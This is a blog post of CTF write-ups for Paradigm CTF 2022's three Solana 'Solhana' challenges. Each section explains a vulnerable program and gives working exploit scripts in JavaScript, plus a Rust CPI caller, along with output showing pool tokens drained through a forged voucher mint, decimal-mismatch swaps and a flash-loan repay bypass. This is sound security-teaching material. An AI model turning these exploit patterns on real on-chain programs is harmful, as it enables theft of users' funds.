---
title: Paradigm CTF 2022 Solhana Writeups
layout: post
date: 2022-08-27
headerImage: false
tag:
- solana
- ctf
- writeups
- security
- rust
- anchor
category: blog
author: sh15h4nk
description: Solhana challs writeups for paradigm ctf.
---
My writeups for the solana challenges at paradigm CTF 2022
<!--more-->





# Intro
I solved all the solana challanges authored by [hana](https://twitter.com/dumbcontract2). Challenges are really cool, I learned a lot of new things while solving.


# SOLHANA 1

- Deposit function basically does a Transfer and Mint:
    - Transfer: transfers from depositor's account to deposit account.
    - Mint: mints tokens to the depositor's account with voucher_mint.

- Withdraw function basically does a Burn and Transfer.
    - Burn: burns the tokens from deposit_voucher_account.
    - Transfer: transfers the tokens from the deposit_account to depositor_account 

- Now account constraints:
    - voucher_mint:
        its mint_authority should be the state.
    - deposit_voucher_account:
        its mint should be voucher_mint.
    - depositor_account:
        needs to be Signer to authorize the transfer and burn.

    - deposit_account:
        should be the account that was previously stored in the state.
    - depositor_account:
        its mint should be equal to the deposit_mint stored in the state.
    - state:
        it should be the state account which was initialized.

## What I understood:

- state: holds the state of the program owned by PDA.
- depositor[Signer]: to approve the transfer and burn.

- voucher_mint, deposit_account : should be owned by the state [user abstraction]

- depositor_Acccount and deposit_account should be of same kind of tokens(of the same mint).
- depositor_voucher_mint should be of a token type minted by voucher_mint.

At the first glance everything looked secure, after illustrating the account constraints I found that the relation b/w voucher_mint account and the state is that voucher_mint's authority is the state and the voucher_mint accounts address is not stored anywhere.

Since the voucher_mint account is not derived from the program, so I thought we could create a arbitary mint and mint some tokens since we created the mint, and finally transfer the ownership to the state. And pass that mint account as a voucher_mint account, since the mint account is owned by the state the constraints on the account are satisified.

## Exploit:
- Create a new arbitrary mint account
- Mint tokens to a new token account owned by the player.
- Transfer the ownership of the mint authority to the state.
- Call the withdraw function with the arbitrary mint account and a depositor_account which is controlled by the player.

```js
// all player code goes here
async function attack() {
    console.log(accounts);
    let amount = await conn.getTokenAccountBalance(accounts.depositAccount).then(_ => new BN(_.value.amount));
    console.log("Amount : "+ amount);

    // creating mint account
    const mint = await spl_token.createMint(conn, player, player.publicKey, null, 0);
    console.log('Created new Mint : ' + mint);

    // creating a fake_depositor_account and minting tokens
    const fake_depositor_account = await spl_token.createAssociatedTokenAccount(conn, player, mint, player.publicKey);
    await spl_token.mintToChecked(conn, player, mint, fake_depositor_account, player, amount, 0);
    console.log(`Minted ${amount} to a new voucher_depositor_account: ${fake_depositor_account}`);

    // transfer the ownership of the mint to state
    await spl_token.setAuthority(conn, player, mint, player, AuthorityType.MintTokens, accounts.state);
    console.log("Transfered the authority to the state");

    // getting the accociated token account of player of bitcoin mint
    let player_bitcoin_token_account = await conn.getParsedTokenAccountsByOwner(player.publicKey, {
            mint: accounts.bitcoinMint,
        }).then(resp => new web3.PublicKey(resp.value[0].pubkey.toString()));
    console.log("Player bitcoin token address: ",player_bitcoin_token_account);
    

    // creating a new transaction
    const txn = new web3.Transaction().add(
        await program.instruction.withdraw(amount, {
        accounts: {
            player: player.publicKey,
            depositor: player.publicKey,
            state: accounts.state,
            depositAccount: accounts.depositAccount,
            voucherMint: mint,
            depositorAccount: player_bitcoin_token_account,
            depositorVoucherAccount: fake_depositor_account,
            tokenProgram: spl_token.TOKEN_PROGRAM_ID
        }})
    );
    // signing and sending the transaction
    const sign = await web3.sendAndConfirmTransaction(conn, txn, [player]);
    console.log("Signature: "+ sign);
}
```
[Source](https://github.com/sh15h4nk/ParadigmCTF-Solhana)\
This should steal the tokens from the deposit account of the state.

```bash
Amount : 1000000
Created new Mint : 2T1ZhsdN8wxhJQwB7ytrKuoessF2oKHnFmRzqEAb2V4A
Minted 1000000 to a new voucher_depositor_account: AKV14tGAMz1GfwGFACokuZUkHhTPBCwFJa3sgUpgk6Ni
Transfered the authority to the state
Player bitcoin token address:  PublicKey {
  _bn: <BN: e22a4f62bd92c39a81da78a835c4d5560e022ca557468ce705e97cefdee25d81>
}
Signature: 5mtRKdd4qqezrQMqKBcEe9h4rHoS37JW3Rb2ASzLmBe29dwN7kcCpGgV2f5vcVbmi7vGpaidpEdK6coaugDU9icZ
Amount : 0
```


<br><br>


# SOLHANA 2

- Deposit does the same as before
    Tokens (woEth,soEth,stEth) are deposited to the pool account and voucher tokens are minted to the user.
    - Transfers the tokens from depositor_account to pool_account.
    - Mints new tokens to the depositor_voucher_account.
    
- Withdraw also does the same as before
    Used to withdraw the voucher tokens for the original tokens.
    - Burns the tokens from depositor_voucher_account.
    - Transfers the tokens from pool_account to depositor_account, that are previously transfered in the deposit fn.

- Swap does two transfers [from_amount: u64]
    - to_amount, check_amount are calculated from the from_amount.
    - Transfers the tokens from from_swapper_account to from_pool_account of amount from_amount.
    - Transfers the tokens from to_pool_account to to_swappers_account of amount to_amount (previously calculated).


## What I understood:
DEPOSIT  = (amount) => Transfers amount of tokens to pool deposit account `&&` Mints tokens to a pool voucher account.\
WITHDRAW = (amount) => Burns the user pool voucher account's tokens `&&` Transfer an amount of tokens to user token account.\
SWAP = (from_amount) => Calculates to_amount `&&` Transfer a from_account to the pool `&&` Transfers a to_amount to swapper.

TBH this looked super secure, since all the account as constraints are strict. As previously I couldn't mint tokens for myself with new mint or create a new arbitrary pools.

Then I wonder, what is the differnce b/w (deposit/withdraw) and swap. In swap a to_amount is calulated, I thought there might be some miscalculations in the function, so I thought to calculate the to_amount and check_amount myself.

```rs
fn main() {
    let from_amount: u64 = 1333337;
    let to_amount: u64 = u64::try_from(
            u128::from(from_amount)
            .checked_mul(10_u128.pow(9)) .unwrap()
            .checked_div(10_u128.pow(9)).unwrap()
        ).unwrap();
    println!("FROM: {}, To: {}", from_amount, to_amount);
}
```
```bash
FROM: 1333337, To: 1333337
```
I played around but nothing is obvious. Then I wonder why there is a need for calculation.
Ahhhhhhhhhh!, then I realized the mistake I made, I have used the default decimal value to do the calculations.
Then I looked up for the decimals, for my surprise decimals values of the tokens are not same.

| Mint      |  Decimal |
| ----------|--------- |
| woEthMint |  8       |
| soEthMint |  6       |
| stEthMint |  8       |

Then I tried several combinations, 1 soEthToken => 100 woEthMint/stEthMint.
```rs
fn main() {
    let from_amount: u64 = 1333337;
    let to_amount: u64 = u64::try_from(
            u128::from(from_amount)
            .checked_mul(10_u128.pow(8)) .unwrap()
            .checked_div(10_u128.pow(6)).unwrap()
        ).unwrap();
    println!("FROM: {}, To: {}", from_amount, to_amount);
}
```

```bash
FROM: 1333337, To: 133333700
```

Okay, now What about the deposit and withdraw, we could send in some (woEthTokens/stEthTokens) to the deposit function and mint soEth Voucher for us. And then we could withdraw the soEth voucher for the original soEth tokens. And from there we could swap the soEth tokens to woEth/stEth tokens.(Which give us 100 tokens for 1 soEth token as we saw above).

We have 1000 tokens of each mint.

```js
// mint accounts
const woEthMint = await spl_token.getMint(conn, accounts.woEthMint);
const soEthMint = await spl_token.getMint(conn, accounts.soEthMint);
const stEthMint = await spl_token.getMint(conn, accounts.stEthMint);
// console.log(woEthMint);
// console.log(soEthMint);
// console.log(stEthMint);

// pool token accounts
const woEthPoolToken = await spl_token.getAccount(conn, accounts.woEthPoolAccount);
const soEthPoolToken = await spl_token.getAccount(conn, accounts.soEthPoolAccount);
const stEthPoolToken = await spl_token.getAccount(conn, accounts.stEthPoolAccount);
console.log(`Pool balances:\n\twoEth: ${woEthPoolToken.amount}, soEth: ${soEthPoolToken.amount}, stEth: ${stEthPoolToken.amount}`);

// player token accounts
const woEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.woEthMint, player.publicKey));
const soEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.soEthMint, player.publicKey));
const stEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.stEthMint, player.publicKey));
console.log(`Player balances:\n\twoEth: ${woEthTokenAccount.amount}, soEth: ${soEthTokenAccount.amount}, stEth: ${stEthTokenAccount.amount}`);
```

```bash
Pool balances:
	woEth: 100000000, soEth: 100000000, stEth: 100000000
Player balances:
	woEth: 1000, soEth: 1000, stEth: 1000
```


## Exploit:
- Deposit some woEth tokens for soEthVoucher tokens.
- Withdraw the soEthVoucher tokens for the original soEth tokens.
- Then we could swap the soEth tokens for the woEth tokens, at the end we left more woEth tokens.

```js
async function attack() {
    console.log(accounts);
    // mint accounts
    const woEthMint = await spl_token.getMint(conn, accounts.woEthMint);
    const soEthMint = await spl_token.getMint(conn, accounts.soEthMint);
    const stEthMint = await spl_token.getMint(conn, accounts.stEthMint);
    // console.log(woEthMint);
    // console.log(soEthMint);
    // console.log(stEthMint);

    // pool token accounts
    const woEthPoolToken = await spl_token.getAccount(conn, accounts.woEthPoolAccount);
    const soEthPoolToken = await spl_token.getAccount(conn, accounts.soEthPoolAccount);
    const stEthPoolToken = await spl_token.getAccount(conn, accounts.stEthPoolAccount);
    console.log(`Pool balances:\n\twoEth: ${woEthPoolToken.amount}, soEth: ${soEthPoolToken.amount}, stEth: ${stEthPoolToken.amount}`);

    // player token accounts
    const woEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.woEthMint, player.publicKey));
    const soEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.soEthMint, player.publicKey));
    const stEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.stEthMint, player.publicKey));
    console.log(`Player balances:\n\twoEth: ${woEthTokenAccount.amount}, soEth: ${soEthTokenAccount.amount}, stEth: ${stEthTokenAccount.amount}`);

    // player pool voucher accounts
    const woEthPoolVoucher = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.woEthVoucherMint, player.publicKey));
    const soEthPoolVoucher = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.soEthVoucherMint, player.publicKey));
    const stEthPoolVoucher = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.stEthVoucherMint, player.publicKey));

    // depositing 1000 woETH Tokens to the pool => we get 1000 soEth Tokens
    let amount = new BN(1000);
    const txn = new anchor.web3.Transaction().add(
        program.instruction.deposit(amount,{
            accounts: {
                player: player.publicKey,                                       //checked
                depositor: player.publicKey,                                    //checked
                state: accounts.state,                                          //checked
                depositMint: soEthMint.address,                               //checked 
                pool: accounts.woEthPool,                                       //checked
                poolAccount: woEthPoolToken.address,                          //checked
                voucherMint: accounts.soEthVoucherMint,                         //checked (to get the soEth voucher mint)
                depositorAccount: woEthTokenAccount.address,                  //checked
                depositorVoucherAccount: soEthPoolVoucher.address,           //checked (to recieve the voucher tokens)
                tokenProgram: TOKEN_PROGRAM_ID,                                 //checked
            }
        }),
        // with drawing the soEth tokens from soEth voucher
        program.instruction.withdraw(amount, {
            accounts: {
                player: player.publicKey,
                depositor: player.publicKey,
                state: accounts.state,
                depositMint: soEthMint.address,
                pool: accounts.soEthPool,
                poolAccount: soEthPoolToken.address,
                voucherMint: accounts.soEthVoucherMint,
                depositorAccount: soEthTokenAccount.address,
                depositorVoucherAccount: soEthPoolVoucher.address,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }),
        // swapping the soEth tokens for woEth tokens
        program.instruction.swap(amount, {
            accounts: {
                player: player.publicKey,
                swapper: player.publicKey,
                state: accounts.state,
                fromPool: accounts.soEthPool,
                toPool: accounts.woEthPool,
                fromPoolAccount: soEthPoolToken.address,
                toPoolAccount: woEthPoolToken.address,
                fromSwapperAccount: soEthTokenAccount.address,
                toSwapperAccount: woEthTokenAccount.address,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        })
    );
    // signing and sending the transaction
    const sign = await anchor.web3.sendAndConfirmTransaction(conn, txn, [player]);
    console.log("Signature: "+ sign);
}
```
[Source](https://github.com/sh15h4nk/ParadigmCTF-Solhana)\
After running the exploit the balances are:
```bash
Pool balances:
	woEth: 100000000, soEth: 100000000, stEth: 100000000
Player balances:
	woEth: 1000, soEth: 1000, stEth: 1000
Signature: LnpCgkUVh4jqYBzrmv7W93o64An7MgwdczusXnHDVrvYVNBNaXfgFRXADWWz82gXCJfgm5HmVfRAivQ2w75wTXY
Pool balances:
	woEth: 99901000, soEth: 100000000, stEth: 100000000
Player balances:
	woEth: 100000, soEth: 1000, stEth: 1000
```

Player could able to steal tokens from the pool, we can also do the same thing with stEth tokens.

<br><br>

# SOLHANA 3

- Deposit and withdraw are same as before.
- Borrow:
    - lends the user some amount of tokens from the pool
    - Ensures that the user calls the repay function in the same transaction with the same amount borrowed.
    - After making sure that repay instruction exists in the transaction, it transfers the tokens to the user.
- Repay:
    - transfer the tokens from user token account to the pool token account.


## What I understood
The program lets the user to borrow the tokens from the pool, and the user must pay back the tokens to the pool in the same transaction, We need to find a way to steal the tokens before repaying the tokens to the program.
One way we could steal the tokens by double borrowing, but the `borrowing` field in the pool account data restricts that.
We need to figure a way to call the repay instruction with 0 amount before double borrowing, but the amount is being validated when we have a call to the repay instruction. We could bypass this by calling the repay instruction from an external program with cpi. This way we could call the repay instruction with 0 amount before the borrowing the funds second time. At last we end up with the half the amount of tokens we borrowed.

# Exploit:
- Writing an external program to call the repay instruction.

```rust
use anchor_lang::prelude::*;

use anchor_spl::token::{ TokenAccount, Token };

use challenge3::{self, Pool, State};
use challenge3::cpi::accounts::Repay;
use challenge3::program::Challenge3;

declare_id!("3dxs6HNWYRGW3LTQygqJaJDYhbGEfA8NR1HKEbpi6rZ6");

#[program]
pub mod caller {
    use super::*;

    pub fn call_repay(ctx: Context<RepayStuff>) -> Result<()> {
        msg!("Calling the repay from other program");
        
        let cpi_program = ctx.accounts.chall3.to_account_info();
        let cpi_accounts = Repay {
            player: ctx.accounts.player.to_account_info(),
            user: ctx.accounts.player.to_account_info(),
            state: ctx.accounts.state.to_account_info(),
            pool: ctx.accounts.pool.to_account_info(),
            pool_account: ctx.accounts.pool_account.to_account_info(),
            depositor_account: ctx.accounts.depositor_account.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info()
        };
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        challenge3::cpi::repay(cpi_ctx, 0)

    }
}

#[derive(Accounts)]
pub struct RepayStuff<'info>{
    pub chall3: Program<'info, Challenge3>,
    pub player: AccountInfo<'info>,
    pub user: Signer<'info>,
    pub state: Account<'info, State>,
    pub pool: Account<'info, Pool>,
    pub pool_account: Account<'info, TokenAccount>,
    pub depositor_account: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
}
```
- Deploying the program locally.

```bash
$ anchor build --program-name caller                  //buliding
$ solana program deploy target/deploy/caller.so       //deploying
Program Id: 3dxs6HNWYRGW3LTQygqJaJDYhbGEfA8NR1HKEbpi6rZ6
```

- The instruction calls:
    borrow(50), repay(0) with the caller program, borrow(50), repay(50) to our program
    By the end we end up with 50 tokens in our account, we could then repeat this to steal all the balance from the pool.

```js
// all player code goes here
async function attack() {

    console.log(accounts);

    // pool balance
    let poolAccount = await spl_token.getAccount(conn, accounts.poolAccount);
    console.log(`Pool amount: ${poolAccount.amount}`);

    // player token account
    let playerTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.atomcoinMint, player.publicKey));
    console.log(`Player amount: ${playerTokenAccount.amount}`);
    
    // caller program
    const callerProgramId = "3dxs6HNWYRGW3LTQygqJaJDYhbGEfA8NR1HKEbpi6rZ6";
    const callerIdl = JSON.parse(fs.readFileSync("../chain/target/idl/caller.json"));
    const callerProgram = new anchor.Program(callerIdl, callerProgramId, "caller program");
    // console.log(callerProgram);

    // list storing all the txns
    const txn = new anchor.web3.Transaction();

    // borrowing 50 
    txn.add(program.instruction.borrow(new BN(50), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // call to repay instruction via our caller program
    txn.add(callerProgram.instruction.callRepay({
        accounts: {
            chall3: accounts.programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID,
        }
    }));

    // borrowing 50
    txn.add(program.instruction.borrow(new BN(50), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // repay 50
    txn.add(program.instruction.repay(new BN(50), {
        accounts: {
            chall3: program._programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    borrowing 25 
    txn.add(program.instruction.borrow(new BN(25), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // call to repay instruction via our caller program
    txn.add(callerProgram.instruction.callRepay({
        accounts: {
            chall3: accounts.programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID,
        }
    }));

    // borrowing 25
    txn.add(program.instruction.borrow(new BN(25), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // repay 25
    txn.add(program.instruction.repay(new BN(25), {
        accounts: {
            chall3: program._programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));


    // borrowing 12 
    txn.add(program.instruction.borrow(new BN(12), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // call to repay instruction via our caller program
    txn.add(callerProgram.instruction.callRepay({
        accounts: {
            chall3: accounts.programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID,
        }
    }));

    // borrowing 12
    txn.add(program.instruction.borrow(new BN(12), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // repay 12
    txn.add(program.instruction.repay(new BN(12), {
        accounts: {
            chall3: program._programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

     
    const sign = await anchor.web3.sendAndConfirmTransaction(conn, txn, [player]);
    console.log("Signature: "+ sign);


    // pool balance
    poolAccount = await spl_token.getAccount(conn, accounts.poolAccount);
    console.log(`Pool amount: ${poolAccount.amount}`);

    // player token account
    playerTokenAccount = playerTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.atomcoinMint, player.publicKey));
    console.log(`Player amount: ${playerTokenAccount.amount}`);
}
```
[Source](https://github.com/sh15h4nk/ParadigmCTF-Solhana)

```bash
Pool amount: 100
Player amount: 0
Signature: 5sCRK6JkPTPfMfL5UVqjBc63G55wNUesZqNy6j6id46ourxYyfKLyMyHgcoXSfQoGUQCyupKzMa5zbpMFsDaxsnb
Pool amount: 13
Player amount: 87
```


<hr>
Thanks for reading :)
<hr>
